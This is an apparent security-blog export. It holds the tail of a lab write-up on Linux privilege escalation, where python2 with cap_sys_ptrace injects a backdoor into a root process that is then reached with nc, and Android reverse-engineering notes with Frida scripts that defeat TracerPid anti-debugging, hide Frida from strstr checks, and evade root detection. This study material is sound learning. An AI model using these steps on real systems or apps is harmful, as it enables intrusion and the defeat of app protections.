<p>把寻常的提权方式试一遍：</p>
<ol>
<li>unam -a 内核提权</li>
<li>sudo -l  查看是否有 sudo 权限配置不当</li>
<li>是否有 suid、sgid 设置不当的文件</li>
</ol>
<p>都没有找到，实在头大。秉着绝大多数提权都是权限相关的操作管理不当，继续找权限配置相关的操作，想到了 Capabilitie 这个 Linux下的权限管理机制。</p>
<p>Capabilitie 是从Linux 内核2.2开始引入的，简单来说就是更细致的权限划分，比如 Wireshark 抓包，并非赋予整个程序抓取底包的权限，而是单独把抓取网络原始数据的能力赋予 Wireshark 进程。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admim=eip /usr/bin/dumpcap  <span class="comment">#赋予 cap_net_raw、cap_net_admim能力</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#详细可参考：https://man7.org/linux/man-pages/man7/capabilities.7.html</span><br></pre></td></tr></table></figure>



<p>秉着这个思路，看是否有 Capabilitie 配置不当的权限。查看当前 Capabilitie 配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null <span class="comment">#递归查询</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/21.png" class title="This is an example image">



<p>可以看到 python2 有  cap_sys_ptrace+ep 权限点，这个是一个调试程序相关的权限，这种涉及底层的权限大多是高权限，则可以利用 python2 的注入来实现提权。先查看以 root 运行的程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -U root  <span class="comment">#随便选个 root 程序，这里选了apache服务，线程号801</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/22.png" class title="This is an example image">



<p>注入脚本 inject.py，参考如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/zlgxzswjy/p/15185591.html</span><br></pre></td></tr></table></figure>



<p>执行注入脚本，会把后门注入到801这个服务中，然后默认开启5600服务，以供远程连接：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2<span class="number">.7</span> inject.py <span class="number">801</span>   <span class="comment">#注入后门</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/23.png" class title="This is an example image">



<p>远程连接后门：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.10 5600  <span class="comment">#远程连接</span></span><br></pre></td></tr></table></figure>

<img src="/2022/12/01/Hacker-Kid/24.png" class title="This is an example image">]]></content>
      <categories>
        <category>红队</category>
      </categories>
      <tags>
        <tag>打靶</tag>
      </tags>
  </entry>
  <entry>
    <title>Notes-Android-II</title>
    <url>/2025/03/08/Notes-Android-II/</url>
    <content><![CDATA[<h1 id="NDK汇编-开发"><a href="#NDK汇编-开发" class="headerlink" title="NDK汇编(开发)"></a>NDK汇编(开发)</h1><h2 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h2><p><a href="https://www.jianshu.com/p/c546783ad284">https://www.jianshu.com/p/c546783ad284</a></p>
<p>idea安装cmake和NDK<br>1、ubuntu自动加进环境变量<br>2、windows要自己添加</p>
<p> source ~&#x2F;.bashrc</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ndk-build NDK_PROJECT_PATH=. NDK_APPLICATION_MK=Application.mk</span><br></pre></td></tr></table></figure>



<p>IDA远程调试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、把 IDA dbgsrv目录下的文件在手机执行 android_server </span><br><span class="line">2、用32位IDA Debugger调试程序</span><br></pre></td></tr></table></figure>



<p>elf文件</p>
<p>arm 模式：定长指令集，四个字节</p>
<p>thumb 模式：不定长</p>
<p>T标志位</p>
<h2 id="clang-开发"><a href="#clang-开发" class="headerlink" title="clang 开发"></a>clang 开发</h2><p><a href="https://developer.android.com/ndk/guides/other_build_systems?hl=zh-cn">https://developer.android.com/ndk/guides/other_build_systems?hl=zh-cn</a></p>
<p><a href="https://www.cnblogs.com/burner/p/clang-fen-si-bu-bian-yimainc.html">https://www.cnblogs.com/burner/p/clang-fen-si-bu-bian-yimainc.html</a></p>
<p>clang路径在SDK&#x2F;NDK下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\AppData\Local\Android\Sdk\ndk\28.0.12674087\toolchains\llvm\prebuilt\windows-x86_64\bin</span><br><span class="line">C:\Users\admin\AppData\Local\Android\Sdk\ndk\28.0.12674087\toolchains\llvm\prebuilt\linux-x86_64\bin</span><br></pre></td></tr></table></figure>



<h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p>安装GEF</p>
<p>GDB multiarch 远程调试，原理同IDA远程调试，需上传服务端文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Sdk/ndk/23.1.7779620/prebuilt/android-arm/gdbserver</span><br><span class="line">./gdbserver :1234 hello.o</span><br><span class="line"></span><br><span class="line">gdb-multiarch</span><br><span class="line">target remote ip:port</span><br><span class="line"></span><br><span class="line">gdb-multiarch</span><br><span class="line">gef-remote -p 3929 ip:port #雷电需要用x86_64版本，提示权限不足</span><br></pre></td></tr></table></figure>

<h1 id="ARM-案例"><a href="#ARM-案例" class="headerlink" title="ARM 案例"></a>ARM 案例</h1><h2 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h2><p>在 .o文件里用汇编代替原有函数(print、getchar)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#printf</span><br><span class="line">#只有return 0的汇编</span><br><span class="line">main:</span><br><span class="line">	.fnstart</span><br><span class="line">@ %bb.0:</span><br><span class="line">	.pad	#4</span><br><span class="line">	sub	sp, sp, #4</span><br><span class="line">	movw	r0, #0</span><br><span class="line">	str	r0, [sp]</span><br><span class="line">	movw	r0, #0</span><br><span class="line">	add	sp, sp, #4</span><br><span class="line">	bx	lr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">	.fnstart</span><br><span class="line">	push &#123;lr&#125;</span><br><span class="line"></span><br><span class="line">	ldr r0,[r1,#4]</span><br><span class="line">	bl printf</span><br><span class="line"></span><br><span class="line">	movw	r0, #0</span><br><span class="line">	pop &#123;lr&#125;</span><br><span class="line">	bx	lr</span><br></pre></td></tr></table></figure>



<h2 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h2><h3 id="根据汇编还原为C代码"><a href="#根据汇编还原为C代码" class="headerlink" title="根据汇编还原为C代码"></a>根据汇编还原为C代码</h3><p>1、IDA打开v7a的 SO文件</p>
<p>2、找到导出 check</p>
<p>3、修改第一个默认参数为 JNIEnv，这样就能关联到内置的函数</p>
<p>4、算法还原</p>
<p>这些R0 、R1指代第一第二个参数吗</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TestDec                                 ; CODE XREF: j_TestDec+8↑j</span><br><span class="line">.text:00001062                                         ; DATA XREF: LOAD:00000250↑o ...</span><br><span class="line">.text:00001062 ; __unwind &#123;</span><br><span class="line">.text:00001062                 PUSH            &#123;R4,R5,R7,LR&#125;</span><br><span class="line">.text:00001064                 ADD             R7, SP, #8</span><br><span class="line">.text:00001066                 MOV             R4, R0</span><br><span class="line">.text:00001068                 BLX             strlen</span><br><span class="line">.text:0000106C                 CMP             R0, #2</span><br><span class="line">.text:0000106E                 BCC             loc_108A</span><br><span class="line">.text:00001070                 MOVS            R5, #0</span><br><span class="line">.text:00001072</span><br><span class="line">.text:00001072 loc_1072                                ; CODE XREF: TestDec+26↓j</span><br><span class="line">.text:00001072                 ADDS            R1, R4, R5</span><br><span class="line">.text:00001074                 LDRB            R0, [R4,R5]</span><br><span class="line">.text:00001076                 LDRB            R2, [R1,#0x10]</span><br><span class="line">.text:00001078                 STRB            R2, [R4,R5]</span><br><span class="line">.text:0000107A                 ADDS            R5, #1</span><br><span class="line">.text:0000107C                 STRB            R0, [R1,#0x10]</span><br><span class="line">.text:0000107E                 MOV             R0, R4  ; s</span><br><span class="line">.text:00001080                 BLX             strlen</span><br><span class="line">.text:00001084                 CMP.W           R5, R0,LSR#1</span><br><span class="line">.text:00001088                 BCC             loc_1072</span><br><span class="line">.text:0000108A</span><br><span class="line">.text:0000108A loc_108A                                ; CODE XREF: TestDec+C↑j</span><br><span class="line">.text:0000108A                 LDRB            R0, [R4]</span><br><span class="line">.text:0000108C                 CBZ             R0, locret_10B8</span><br><span class="line">.text:0000108E                 LDRB            R1, [R4,#1]</span><br><span class="line">.text:00001090                 STRB            R1, [R4]</span><br><span class="line">.text:00001092                 STRB            R0, [R4,#1]</span><br><span class="line">.text:00001094                 MOV             R0, R4  ; s</span><br><span class="line">.text:00001096                 BLX             strlen</span><br><span class="line">.text:0000109A                 CMP             R0, #3</span><br><span class="line">.text:0000109C                 BCC             locret_10B8</span><br><span class="line">.text:0000109E                 MOVS            R5, #0</span><br><span class="line">.text:000010A0</span><br><span class="line">.text:000010A0 loc_10A0                                ; CODE XREF: TestDec+54↓j</span><br><span class="line">.text:000010A0                 ADDS            R0, R4, R5</span><br><span class="line">.text:000010A2                 LDRB            R1, [R0,#2]</span><br><span class="line">.text:000010A4                 LDRB            R2, [R0,#3]</span><br><span class="line">.text:000010A6                 STRB            R2, [R0,#2]</span><br><span class="line">.text:000010A8                 STRB            R1, [R0,#3]</span><br><span class="line">.text:000010AA                 MOV             R0, R4  ; s</span><br><span class="line">.text:000010AC                 BLX             strlen</span><br><span class="line">.text:000010B0                 ADDS            R1, R5, #4</span><br><span class="line">.text:000010B2                 ADDS            R5, #2</span><br><span class="line">.text:000010B4                 CMP             R1, R0</span><br><span class="line">.text:000010B6                 BCC             loc_10A0</span><br><span class="line">.text:000010B8</span><br><span class="line">.text:000010B8 locret_10B8                             ; CODE XREF: TestDec+2A↑j</span><br><span class="line">.text:000010B8                                         ; TestDec+3A↑j</span><br><span class="line">.text:000010B8                 POP             &#123;R4,R5,R7,PC&#125;</span><br><span class="line">.text:000010B8 ; End of function TestDec</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">TestDec</span><span class="params">(<span class="type">char</span> *str)</span>&#123;</span><br><span class="line">    <span class="type">char</span> *r4 = str;</span><br><span class="line">    <span class="type">int</span> lenstr = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(lenstr&gt;=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> r5=<span class="number">0</span>;r5&lt; lenstr&gt;&gt;<span class="number">1</span>;r5++)&#123;</span><br><span class="line">            <span class="type">char</span> * r1 = r4+r5;</span><br><span class="line">            <span class="type">char</span> r0 = *(r4+r5);</span><br><span class="line">            <span class="type">char</span> r2 = *(r1+<span class="number">16</span>);</span><br><span class="line">            *(r4+r5) = r2;</span><br><span class="line">            *(r1+<span class="number">16</span>) = r0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> r0 = *(r4);</span><br><span class="line">    <span class="keyword">if</span>(r0)&#123;</span><br><span class="line">        <span class="type">char</span> r1 = *(r4+<span class="number">1</span>);</span><br><span class="line">        *(r4) = r1;</span><br><span class="line">        *(r4+<span class="number">1</span>) = r0;</span><br><span class="line">        <span class="keyword">if</span>(lenstr &gt;= <span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> r5=<span class="number">0</span>; r5+<span class="number">4</span> &lt; lenstr;r5+=<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="type">char</span> *rr0 = r4+r5;</span><br><span class="line">                <span class="type">char</span> rr1 = *(rr0+<span class="number">2</span>);</span><br><span class="line">                <span class="type">char</span> rr2 = *(rr0+<span class="number">3</span>);</span><br><span class="line">                *(rr0+<span class="number">2</span>) = rr2;</span><br><span class="line">                *(rr0+<span class="number">3</span>) = rr1;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,r4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> *s = <span class="string">&quot;9007b55be5bf95adf72c5a365694182a&quot;</span>;</span><br><span class="line">    <span class="type">int</span> lenstr = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="type">char</span> *arg = (<span class="type">char</span>*)<span class="built_in">malloc</span>(lenstr+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memset</span>(arg,<span class="number">0</span>,lenstr+<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(arg,s,lenstr);</span><br><span class="line">    TestDec(arg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="可引入IDA-提供的-defs-h-后直接运行伪代码"><a href="#可引入IDA-提供的-defs-h-后直接运行伪代码" class="headerlink" title="可引入IDA 提供的 defs.h 后直接运行伪代码"></a>可引入IDA 提供的 defs.h 后直接运行伪代码</h3><p><a href="https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1584115&amp;highlight=ida">https://www.52pojie.cn/forum.php?mod=viewthread&amp;tid=1584115&amp;highlight=ida</a></p>
<p>IDA快捷键&amp;常用方法</p>
<ul>
<li>汇编 &amp; 伪代码的跳转（空格、Tab）</li>
<li>强制当做代码&#x2F;数据（C、D）</li>
<li>数据 convert</li>
<li>重命名</li>
<li>查找调用链，Xref graph to</li>
<li>插件使用</li>
</ul>
<p><a href="https://blog.csdn.net/qq_41028985/article/details/119407917">https://blog.csdn.net/qq_41028985/article/details/119407917</a></p>
<h1 id="熟悉算法"><a href="#熟悉算法" class="headerlink" title="熟悉算法"></a>熟悉算法</h1><p>用于识别魔改算法或分析算法</p>
<p><strong>输入信息&#x2F;输出信息要hex编码</strong> </p>
<p>md5算法</p>
<p>SHA1算法</p>
<p>SHA2&#x2F;256&#x2F;512等后续一堆</p>
<h2 id="HMAC（salt）"><a href="#HMAC（salt）" class="headerlink" title="HMAC（salt）"></a>HMAC（salt）</h2><ul>
<li>自行根据字符串计算hmac对照</li>
</ul>
<p><a href="https://space.bilibili.com/253413704">https://space.bilibili.com/253413704</a></p>
 

 

 

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">message：加密消息</span><br><span class="line">key：加密密钥（需要补充）</span><br><span class="line">opad 和 ipad 都是固定</span><br></pre></td></tr></table></figure>

 

 

 

<h2 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1134y1Y71j</span><br><span class="line">https://www.bilibili.com/video/BV1QW411B7A4</span><br><span class="line">https://www.bilibili.com/video/BV1KQ4y127AT</span><br><span class="line">https://juejin.cn/post/7084242293816983589</span><br><span class="line">https://cloud.tencent.com/developer/article/1497864</span><br></pre></td></tr></table></figure>

<p><a href="https://www.cnblogs.com/jikexianfeng/p/10192024.html">https://www.cnblogs.com/jikexianfeng/p/10192024.html</a></p>
<p>CLion</p>
<h2 id="分组加密"><a href="#分组加密" class="headerlink" title="分组加密"></a>分组加密</h2><p><a href="https://blog.csdn.net/a745233700/article/details/102311776">https://blog.csdn.net/a745233700/article/details/102311776</a></p>
<p><a href="https://segmentfault.com/a/1190000040964999">https://segmentfault.com/a/1190000040964999</a></p>
<p><a href="https://www.bilibili.com/video/BV1U8411f74f/">https://www.bilibili.com/video/BV1U8411f74f/</a></p>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p><a href="https://www.bilibili.com/video/BV1824y1y7gc">https://www.bilibili.com/video/BV1824y1y7gc</a></p>
<p>12345678，8个字节，64个位</p>
<p>APK未抹去符号表，MD5算法是否魔改分析</p>
<p>1、提取 so，用IDA分析</p>
<p>2、根据原MD5的几个关键步骤，分析汇编。搜索固定的表内容，没被魔改可以搜到</p>
<p>3、Hook SO地址</p>
<p>MD5常见魔改点：</p>
<p>1、明文加盐或填充</p>
<p>2、初始魔数的修改</p>
<p>3、常量表K</p>
<p>4、左移次数</p>
<p>5、F,G,H,I四个非线性变换函数等的逻辑</p>
<p>unidbg</p>
<p>IDA快捷键：H、Y、Tab</p>
<h1 id="IDA-动态调试之反调试"><a href="#IDA-动态调试之反调试" class="headerlink" title="IDA 动态调试之反调试"></a>IDA 动态调试之反调试</h1><p>遗留问题：虚拟机debuggable&#x3D;1</p>
<p>1、getprop ro.debuggable &#x3D; 0 的话 IDA 动态调试看不到进程名，部分功能被屏蔽</p>
<p>真机用：agiskHide Props Config 修改成功</p>
<p>虚拟机暂未成功</p>
<p>2、查看线程名要用新版的IDA，实测7.0的看不到，7.7的就看得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Attach模式 附加 so动态调试。过掉反调试的方法</span><br><span class="line">2.Spwan模式  过掉反调试的方法：这里讲原理</span><br><span class="line"></span><br><span class="line">1. nop掉</span><br><span class="line">2. 挂起线程</span><br><span class="line">3. frida hook</span><br></pre></td></tr></table></figure>



<p>IDA调试tips:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、真机无网络通过USB调试，需配置端口转发才能IDA远程调试</span><br><span class="line">adb forward tcp:23946 tcp:23946  本机-&gt;设备</span><br><span class="line">adb reverse tcp:23946 tcp:23946  设备-&gt;本机</span><br><span class="line">adb forward --remove tcp:&lt;port&gt;</span><br><span class="line"></span><br><span class="line">2、静态调试和动态调试，IDA自动化分析的注释不同</span><br></pre></td></tr></table></figure>



<p>步骤：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、进入IDA动态调试，点击运行崩溃</span><br><span class="line">2、在Threads窗口，找和包名一样的线程，Suspended 挂起运行正常</span><br><span class="line">3、在Modules窗口，搜索包名/运行关键词/check/security，找到检测/校验模块，双击进入对应代码，下断点</span><br><span class="line">4、点击触发，Tab切换伪代码</span><br></pre></td></tr></table></figure>



<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">ByPassTracerPid</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> fgetsPtr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libc.so&quot;</span>, <span class="string">&quot;fgets&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> fgets = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(fgetsPtr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(fgetsPtr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">buffer, size, fp</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> retval = <span class="title function_">fgets</span>(buffer, size, fp);</span><br><span class="line">      <span class="keyword">var</span> bufstr = <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(buffer);</span><br><span class="line">      <span class="keyword">if</span> (bufstr.<span class="title function_">indexOf</span>(<span class="string">&quot;TracerPid:&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">writeUtf8String</span>(buffer, <span class="string">&quot;TracerPid:\t0&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;tracerpid replaced: &quot;</span> + <span class="title class_">Memory</span>.<span class="title function_">readUtf8String</span>(buffer));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>, <span class="string">&#x27;int&#x27;</span>, <span class="string">&#x27;pointer&#x27;</span>]));</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">setImmediate</span>(<span class="title class_">ByPassTracerPid</span>);</span><br></pre></td></tr></table></figure>



<p>参考文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Android修改ro.debuggable 的四种方法</span><br><span class="line">https://blog.csdn.net/jinmie0193/article/details/111355867</span><br><span class="line"></span><br><span class="line">IDA动态调试破解AliCrackme与反调试对抗</span><br><span class="line">https://blog.csdn.net/weixin_39190897/article/details/120808079</span><br><span class="line"></span><br><span class="line">[原创]2015年AliCrackMe第二题的分析之人肉过反调试 </span><br><span class="line">https://bbs.pediy.com/thread-258595.htm</span><br><span class="line"></span><br><span class="line">常用命令:</span><br><span class="line">adb shell am start -D -n com.yaotong.crackme/.MainActivity</span><br><span class="line">adb shell ps | findstr crackme</span><br><span class="line">jdwp协议端口转发:adb forward tcp:8700 jdwp:2494</span><br><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</span><br></pre></td></tr></table></figure>



<h1 id="APP过ROOT检测"><a href="#APP过ROOT检测" class="headerlink" title="APP过ROOT检测"></a>APP过ROOT检测</h1><p>安装面具:<br><a href="https://www.bilibili.com/video/BV1UN4y137Z5/?vd_source=43c2c404de6d798650d44c856ee1e992">https://www.bilibili.com/video/BV1UN4y137Z5/?vd_source=43c2c404de6d798650d44c856ee1e992</a><br><a href="https://bbs.kanxue.com/thread-263203.htm">https://bbs.kanxue.com/thread-263203.htm</a></p>
<p>修改固有面具（修改源码）</p>
<p><a href="https://blog.csdn.net/qq_41155858/article/details/127885048">https://blog.csdn.net/qq_41155858/article/details/127885048</a></p>
<p>root检测：<br>    1.在代码中检测  -&gt; hook&#x2F;修改重打包（代码固有API检测是否root？）<br>    2.检测系统属性（检测app安装的系统环境参数）<br>    3.查找字符串（查找root关键词，比如su）</p>
<p>对抗方法:	<br>    1.hook<br>    2.最新版magisk（配置排除列表、随机文件名） + shamiko(可有可无)+随机magisk<br>    3.需要重新编译面具  改su名称（这个有点麻烦，最新版gsyh过不去就这个）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小米6重装最新版Magisk就可以了，直接过三个（新版的gs只开还是过不了）</span><br><span class="line">adb reboot bootloader</span><br><span class="line">https://magiskcn.com/</span><br><span class="line">https://blog.csdn.net/qq_42663692/article/details/135704736</span><br></pre></td></tr></table></figure>

<p>绕过的具体操作<br>1、最新版面具<br>2、修改面具名称<br>3、用自带的隐藏root模块<br>4、修改su名称</p>
<p>Tips：<br>1、面具安装在真机，需要提取真机boot，通过面具修复后生成.img文件，再重新刷回手机<br>2、面具安装在模拟器，要安装修改的magisk-delta版本，有直接刷在系统选项（<a href="https://magisk-delta.com/%EF%BC%89">https://magisk-delta.com/）</a></p>
<h1 id="自编译面具"><a href="#自编译面具" class="headerlink" title="自编译面具"></a>自编译面具</h1><p>环境：win10</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、用AS自带的 java11，设置为环境变量</span><br><span class="line">2、全程挂梯子</span><br><span class="line">3、windows 用旧版 python，如python3.8</span><br><span class="line"></span><br><span class="line">git clone --recurse-submodules https://github.com/topjohnwu/Magisk.git </span><br><span class="line">python build.py ndk</span><br><span class="line">python build.py clean</span><br><span class="line">python build.py -v all</span><br></pre></td></tr></table></figure>

<p>需要修改成自定义指令的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">val isActive = versionCode &gt; 0 追踪逻辑</span><br><span class="line">&quot;su&quot;,&quot;--mount-master&quot;</span><br></pre></td></tr></table></figure>

<p>Apktoolbox 重打包</p>
<p>windwos坑太多，用ubuntu试试，用ubuntu挂梯子</p>
<p>参考链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://blog.csdn.net/qq_41155858/article/details/127885048?spm=1001.2014.3001.5506</span><br><span class="line">https://zhuanlan.zhihu.com/p/385255256</span><br></pre></td></tr></table></figure>





<h1 id="frida-反调试"><a href="#frida-反调试" class="headerlink" title="frida 反调试"></a>frida 反调试</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">参考文章: [翻译]多种特征检测 Frida -&gt;https://bbs.pediy.com/thread-217482.htm</span><br><span class="line"></span><br><span class="line">从inlinehook角度检测frida-&gt;https://blog.csdn.net/u010559109/article/details/120846740</span><br><span class="line">9</span><br><span class="line">Android逆向——过frida检测+so层算法逆向https://blog.csdn.net/weixin_43889136/article/details/127713563</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">原理:当被调试器附加之后 不为0:https://wiki.hackjie.com/2728.html</span><br><span class="line"></span><br><span class="line"> ptrace占坑:</span><br><span class="line"> https://bbs.pediy.com/thread-268155.htm#msg_header_h2_16</span><br><span class="line"></span><br><span class="line">adb shell dumpsys window w |grep \/ |grep name=</span><br></pre></td></tr></table></figure>

<p>fridacheck app</p>
<p>Process terminated douban strstr</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 为什么这样就可以hook，不输入脚本？还是原先有脚本？只是绕过-UF？</span></span><br><span class="line">frida -U -f xxx</span><br><span class="line">%resume</span><br><span class="line"></span><br><span class="line">ps -e | grep xxx</span><br><span class="line">adb shell dumpsys window w | grep \/ | grep name=</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改端口、修改文件名(进程名)</span></span><br><span class="line">./frida-server-pass -l 0.0.0.0:1234</span><br><span class="line">adb forward tcp:1234 tcp:1234</span><br><span class="line">frida -H 手机ip:1234 -F</span><br><span class="line"></span><br><span class="line">hook_RegisterNatives.js</span><br><span class="line">https://github.com/zhkl0228/unidbg</span><br><span class="line"><span class="comment"># 获取的偏移值可直接在IDA g搜索，此时是加载状态吗，直接hook Native为什么不准确</span></span><br><span class="line">修改第一个参数为 JNIEnv*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 线程检测</span></span><br><span class="line">通过IDA分析所用检测的方法，根据检测逻辑去hook fgets、fopen，为什么直接hook整个检测函数</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">hook_readlink</span></span>() &#123;&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">main</span></span>()&#123;</span><br><span class="line">    hook_readlink()</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">// code.js</span><br><span class="line">function hook_strstr() &#123;</span><br><span class="line">    // char *strstr(const char *haystack, const char *needle) 在字符串 haystack 中查找第一次出现字符串 needle 的位置，不包含终止符</span><br><span class="line">    var strstr = Module.findExportByName(null, &quot;strstr&quot;);</span><br><span class="line">    if (null !== strstr) &#123;</span><br><span class="line">        Interceptor.attach(strstr, &#123;</span><br><span class="line">            onEnter: function (args) &#123;</span><br><span class="line">                this.frida = Boolean(0);</span><br><span class="line">                this.haystack = args[0];</span><br><span class="line">                this.needle = args[1];</span><br><span class="line">                if (this.haystack.readCString() !== null &amp;&amp; this.needle.readCString() !== null) &#123;</span><br><span class="line">                    if (this.haystack.readCString().indexOf(&quot;frida&quot;) !== -1 ||</span><br><span class="line">                        this.needle.readCString().indexOf(&quot;frida&quot;) !== -1 ||</span><br><span class="line">                        this.haystack.readCString().indexOf(&quot;gum-js-loop&quot;) !== -1 ||</span><br><span class="line">                        this.needle.readCString().indexOf(&quot;gum-js-loop&quot;) !== -1 ||</span><br><span class="line">                        this.haystack.readCString().indexOf(&quot;gmain&quot;) !== -1 ||</span><br><span class="line">                        this.needle.readCString().indexOf(&quot;gmain&quot;) !== -1 ||</span><br><span class="line">                        this.haystack.readCString().indexOf(&quot;linjector&quot;) !== -1 ||</span><br><span class="line">                        this.needle.readCString().indexOf(&quot;linjector&quot;) !== -1) &#123;</span><br><span class="line">                        this.frida = Boolean(1);</span><br><span class="line">                    &#125;</span><br><span class="line">                    console.log(&quot;this.haystack.readCString():&quot;,this.haystack.readCString())</span><br><span class="line">                    console.log(&quot;this.needle.readCString():&quot;,this.needle.readCString())</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave: function (retval) &#123;</span><br><span class="line">                if (this.frida) &#123;</span><br><span class="line">                    retval.replace(ptr(&quot;0x0&quot;));</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        console.log(&quot;anti anti-frida&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    console.log(&quot;hook strstr over&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function main()&#123;</span><br><span class="line">    hook_strstr();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setImmediate(main);</span><br></pre></td></tr></table></figure>



